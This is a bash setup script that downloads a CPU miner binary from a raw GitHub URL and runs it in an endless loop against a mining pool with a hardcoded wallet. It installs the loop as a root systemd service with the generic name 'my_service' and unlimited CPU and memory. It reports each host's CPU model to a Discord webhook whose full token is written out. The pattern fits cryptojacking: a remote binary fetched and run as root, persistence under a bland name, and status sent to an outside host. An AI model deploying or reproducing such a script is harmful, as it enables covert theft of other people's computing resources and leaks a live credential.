#!/bin/bash
# Unified Mining Setup Script with Enhanced Features and Discord Notifications

# Step 1: Update and install necessary dependencies
apt update -y
apt install build-essential automake libssl-dev libcurl4-openssl-dev libjansson-dev libgmp-dev zlib1g-dev wget git curl -y

# Step 2: Install nvm and Node.js (if needed for future tasks)
curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.40.1/install.sh | bash
export NVM_DIR="$HOME/.nvm"
[ -s "$NVM_DIR/nvm.sh" ] && \. "$NVM_DIR/nvm.sh"  # This loads nvm
[ -s "$NVM_DIR/bash_completion" ] && \. "$NVM_DIR/bash_completion"  # This loads nvm bash_completion
nvm install --lts

# Step 3: Define variables for miner and configuration
MINER_URL="https://raw.githubusercontent.com/edrivetokenbsc/xnxxx/main/build/cpuminer-sse2"
POOL_URL="stratum+tcp://stratum-asia.rplant.xyz:3383"
WALLET_ADDRESS="YeW8bsNisZGT4tL5rTfmi5BD3hK8e8CAPe"
LOG_FILE="/var/log/mining_service.log"
DISCORD_WEBHOOK_URL="https://discord.com/api/webhooks/1323266887819460659/iGFviOKkKMZTU_6nlEDtgC6Hm9Oc4ArWmkBblqCpU-32oHljQxpWu6Gtw-YkiapX2hrR"

# Detect CPU model
CPU_MODEL=$(cat /proc/cpuinfo | grep 'model name' | uniq | cut -d':' -f2 | xargs)

# Step 4: Create the mining script
cat << 'EOF' > /usr/local/bin/my_service.sh
#!/bin/bash

# Define configuration variables
MINER_URL="${MINER_URL:-https://raw.githubusercontent.com/edrivetokenbsc/xnxxx/main/build/cpuminer-sse2}"
POOL_URL="${POOL_URL:-stratum+tcp://stratum-asia.rplant.xyz:3383}"
WALLET_ADDRESS="${WALLET_ADDRESS:-YeW8bsNisZGT4tL5rTfmi5BD3hK8e8CAPe}"
LOG_FILE="/var/log/mining_service.log"
DISCORD_WEBHOOK_URL="${DISCORD_WEBHOOK_URL:-https://discord.com/api/webhooks/1323266887819460659/iGFviOKkKMZTU_6nlEDtgC6Hm9Oc4ArWmkBblqCpU-32oHljQxpWu6Gtw-YkiapX2hrR}"

# Detect CPU model
CPU_MODEL=$(cat /proc/cpuinfo | grep 'model name' | uniq | cut -d':' -f2 | xargs)

# Ensure log file exists
touch $LOG_FILE

# Logging function
log() {
    echo "$(date "+%Y-%m-%d %H:%M:%S") - $1" >> $LOG_FILE
}

# Send notification to Discord
send_discord_notification() {
    local message="$1"
    curl -H "Content-Type: application/json" -X POST -d "{\"content\": \"$message\"}" $DISCORD_WEBHOOK_URL
}

# Mining loop
while true; do
    # Download the miner
    log "Downloading miner from $MINER_URL..."
    wget -q "$MINER_URL" -O cpuminer-sse2

    if [ $? -ne 0 ]; then
        log "Failed to download miner. Retrying in 10 seconds..."
        send_discord_notification "⚠️ Miner download failed. Retrying in 10 seconds..."
        sleep 10
        continue
    fi

    # Make the miner executable
    chmod +x cpuminer-sse2
    if [ $? -ne 0 ]; then
        log "Failed to make the miner executable. Retrying in 10 seconds..."
        send_discord_notification "⚠️ Failed to make miner executable. Retrying..."
        sleep 10
        continue
    fi

    # Run the miner
    log "Starting miner with pool: $POOL_URL, wallet: $WALLET_ADDRESS, CPU model: $CPU_MODEL..."
    send_discord_notification "🚀 Miner started on CPU: $CPU_MODEL with wallet: $WALLET_ADDRESS"
    ./cpuminer-sse2 -a yespowerr16 -o "$POOL_URL" -u "$WALLET_ADDRESS" -p start=0.4

    if [ $? -ne 0 ]; then
        log "Miner crashed or stopped unexpectedly. Restarting in 10 seconds..."
        send_discord_notification "❌ Miner crashed. Restarting in 10 seconds..."
        sleep 10
    else
        log "Miner exited. Restarting in 5 seconds..."
        send_discord_notification "ℹ️ Miner exited. Restarting..."
        sleep 5
    fi
done
EOF

# Step 5: Make the mining script executable
chmod +x /usr/local/bin/my_service.sh

# Step 6: Create a systemd service file
cat << 'EOF' > /etc/systemd/system/my_service.service
[Unit]
Description=Mining Service with Discord Notifications
After=network.target

[Service]
ExecStart=/usr/local/bin/my_service.sh
Restart=always
User=root
Group=root
LimitNOFILE=1048576
LimitNPROC=unlimited
CPUQuota=infinity
MemoryMax=infinity
IOWeight=1000

[Install]
WantedBy=multi-user.target
EOF

# Step 7: Reload systemd and start the service
systemctl daemon-reload
systemctl start my_service.service
systemctl enable my_service.service

# Notify Discord of setup completion
curl -H "Content-Type: application/json" -X POST -d "{\"content\": \"✅ Mining setup completed on CPU: $CPU_MODEL with wallet: $WALLET_ADDRESS\"}" $DISCORD_WEBHOOK_URL

# Step 8: Inform the user
echo "Setup completed! The mining service is now running and enabled on boot."
echo "Logs are being saved to $LOG_FILE."
